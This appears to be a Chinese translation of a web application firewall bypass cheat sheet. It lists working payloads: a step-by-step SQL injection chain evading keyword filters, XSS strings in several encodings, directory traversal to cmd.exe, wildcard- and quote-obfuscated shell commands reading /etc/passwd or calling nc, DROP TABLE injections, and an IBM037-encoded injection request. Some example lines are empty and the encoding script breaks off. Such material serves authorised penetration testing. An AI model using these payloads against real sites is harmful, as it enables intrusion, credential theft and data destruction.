翻译文
> 
### fuzz/爆破
  * 字典
    * [Seclists/Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
    * [Fuzz-DB/Attack](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack)
    * [Other Payloads](https://github.com/foospidy/payloads)  
可能会被ban ip，小心为妙。
### 正则绕过
多少waf 使用正则匹配。
#### 黑名单检测/bypass
**Case** : SQL 注入
##### • Step 1:
**过滤关键词** : `and`, `or`, `union`  
**可能正则** : `preg_match('/(and|or|union)/i', $id)`
  * **被拦截的语句** : `union select user, password from users`
  * **bypass语句** : `1 || (select user from users where user_id = 1) = 'admin'`
##### • Step 2:
**过滤关键词** : `and`, `or`, `union`, `where`
  * **被拦截的语句** : `1 || (select user from users where user_id = 1) = 'admin'`
  * **bypass语句** : `1 || (select user from users limit 1) = 'admin'`
##### • Step 3:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`
  * **被拦截的语句** : `1 || (select user from users limit 1) = 'admin'`
  * **bypass语句** : `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
##### • Step 4:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`, `group by`
  * **被拦截的语句** : `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
  * **bypass语句** : `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
##### • Step 5:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`
  * **被拦截的语句** : `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
  * **bypass语句** : `1 || 1 = 1 into outfile 'result.txt'`
  * **bypass语句** : `1 || substr(user,1,1) = 'a'`
##### • Step 6:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`
  * **被拦截的语句** : `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
  * **bypass语句** : `1 || user_id is not null`
  * **bypass语句** : `1 || substr(user,1,1) = 0x61`
  * **bypass语句** : `1 || substr(user,1,1) = unhex(61)`
##### • Step 7:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`,
`hex`
  * **被拦截的语句** : `1 || substr(user,1,1) = unhex(61)`
  * **bypass语句** : `1 || substr(user,1,1) = lower(conv(11,10,36))`
##### • Step 8:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`,
`hex`, `substr`
  * **被拦截的语句** : `1 || substr(user,1,1) = lower(conv(11,10,36))`
  * **bypass语句** : `1 || lpad(user,7,1)`
##### • Step 9:
**过滤关键词** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`,
`hex`, `substr`, `white space`
  * **被拦截的语句** : `1 || lpad(user,7,1)`
  * **bypass语句** : `1%0b||%0blpad(user,7,1)`
### 混淆 编码
**1\. 大小写**
**标准** : ``  
**Bypassed** : ``
**标准** : `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
**Bypassed** : `sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'`
**2\. URL 编码**
**被阻断语句** : `"/oNloaD=confirm()//`  
**Bypassed** : `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`
**被阻断语句** : `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`  
**Bypassed** :
`uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`
**3\. Unicode 编码**
**标准** : ``  
**混淆** : ``
**被阻断语句** : `/?redir=http://google.com`  
**Bypassed** : `/?redir=http://google。com` (Unicode 替代)
**被阻断语句** : `x`  
**Bypassed** : `＜marquee loop＝1 onfinish＝alert︵1)>x` (Unicode 替代)
> **TIP:** 查看这些说明 [this](https://hackerone.com/reports/231444) and
> [this](https://hackerone.com/reports/231389) reports on HackerOne. :)
**4\. HTML 实体编码**
**标准** : `">`  
**Encoded** : `&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;`
(General form)  
**Encoded** : `&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;`
(Numeric reference)
**5\. 混合编码**
  * Sometimes, WAF rules often tend to filter out a specific type of encoding.
  * This type of filters can be bypassed by mixed encoding payloads.
  * Tabs and newlines further add to obfuscation.
**混淆** :
    XSS
**7\. 双重URL编码**
  * 这个需要服务端多次解析了url编码
**标准** : `http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\`  
**混淆** :
`http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\`
**标准** : ``  
**混淆** : `%253Cscript%253Ealert()%253C%252Fscript%253E`
**8\. 通配符使用**
  * 用于linux命令语句注入，通过shell通配符绕过
**标准** : `/bin/cat /etc/passwd`  
**混淆** : `/???/??t /???/??ss??`  
Used chars: `/ ? t s`
**标准** : `/bin/nc 127.0.0.1 1337`  
**混淆** : `/???/n? 2130706433 1337`  
Used chars: `/ ? n [0-9]`
**9\. 动态payload 生成**
**标准** : ``  
**混淆** : ``
**标准** : `/bin/cat /etc/passwd`  
**混淆** : `/bi'n'''/c''at' /e'tc'/pa''ss'wd`
> Bash allows path concatenation for execution.
**标准** : ``  
**混淆** :
``
**9\. 垃圾字符**
  * Normal payloads get filtered out easily.
  * Adding some junk chars helps avoid detection (specific cases only).
  * They often help in confusing regex based firewalls.
**标准** : ``  
**混淆** : ``
**标准** : ``  
**混淆** : ``
> **NOTE:** 上述语句可能会破坏正则的匹配，达到绕过。
**标准** : `ClickMe`  
**Bypassed** : `ClickMe`
**10\. 插入换行符**
  * 部分waf可能会对换行符没有匹配
**标准** : ``  
**混淆** : ``
**11\. 未定义变量**
  * bash 和 perl 执行脚本中加入未定义变量，干扰正则。
> **TIP:** 随便写个不存在的变量就好。`$aaaa,$sdayuhjbsad,$dad2ed`都可以。
  * **Level 1 Obfuscation** : Normal  
**标准** : `/bin/cat /etc/passwd`  
**混淆** : `/bin/cat$u /etc/passwd$u`
  * **Level 2 Obfuscation** : Postion Based  
**标准** : `/bin/cat /etc/passwd`  
**混淆** : `$u/bin$u/cat$u $u/etc$u/passwd$u`
  * **Level 3 Obfuscation** : Random characters  
**标准** : `/bin/cat /etc/passwd`  
**混淆** : `$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff`
一个精心制作的payload
    $sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
**12\. Tab 键和换行符**
  * 大多数waf匹配的是空格不是Tab
**标准** : ``  
**Bypassed** : ``  
**变形** : ``
**标准** : `http://test.com/test?id=1 union select 1,2,3`  
**标准** : `http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3`
**标准** : ``  
**混淆** :
**13\. Token Breakers(翻译不了 看起来说的就是sql注入闭合)**
  * Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.
  * Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.
  * However, the request must still remain valid while using token-breakers.
  * **Case** : Unknown Token for the Tokenizer
    * **Payload** : `?id=‘-sqlite_version() UNION SELECT password FROM users --`
  * **Case** : Unknown Context for the Parser (Notice the uncontexted bracket)
    * **Payload 1** : `?id=123);DROP TABLE users --`
    * **Payload 2** : `?id=1337) INTO OUTFILE ‘xxx’ --`
> **TIP:** 更多payload可以看这里 [cheat sheet](https://github.com/attackercan/cpp-> sql-fuzzer).
**14\. 其他格式混淆**
  * 许多web应用程序支持不同的编码类型(如下表)
  * 混淆成服务器可解析、waf不可解析的编码类型
**Case:** IIS
  * IIS6, 7.5, 8 and 10 (ASPX v4.x) 允许 **IBM037** 字符
  * 可以发送编码后的参数名和值
原始请求:
    POST /sample.aspx?id1=something HTTP/1.1
    HOST: victim.com
    Content-Type: application/x-www-form-urlencoded; charset=utf-8
    Content-Length: 41
    id2='union all select * from users--
混淆请求 + URL Encoding:
    POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1
    HOST: victim.com
    Content-Type: application/x-www-form-urlencoded; charset=ibm037
    Content-Length: 115
    %89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60
The following table shows the support of different character encodings on the
tested systems (when messages could be 混淆 using them):
> **TIP:** 可以使用 [这个小脚本](https://github.com/0xInfection/Awesome-> WAF/blob/master/others/obfu.py) 来转化编码
    import urllib.parse, sys
    from argparse import ArgumentParser
    lackofart = '''
            OBFUSCATOR
    '''
    def paramEncode(params="", charset="", encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):
        result = ""
        equalSign = "="
        ampersand = "&"
        if '=' and '&' in params:
            if encodeEqualSign:
                equalSign = equalSign.encode(charset)
            if encodeAmpersand:
                ampersand = ampersand.encode(charset)
            params_list = params.split("&")
            for param_pair in params_list:
                param, value = param_pair.split("=")
                if urlDecodeInput:
                    param = urllib.parse.unquote(param)
                    value = urllib.parse.unquote(value)
                param = param.encode(charset)
                value = value.encode(charset)
                if urlEncodeOutput:
                    param = urllib.parse.quote_plus(param)
                    value = urllib.parse.quote_plus(value)
                if result:
                    result += ampersand
                result += param + equalSign + value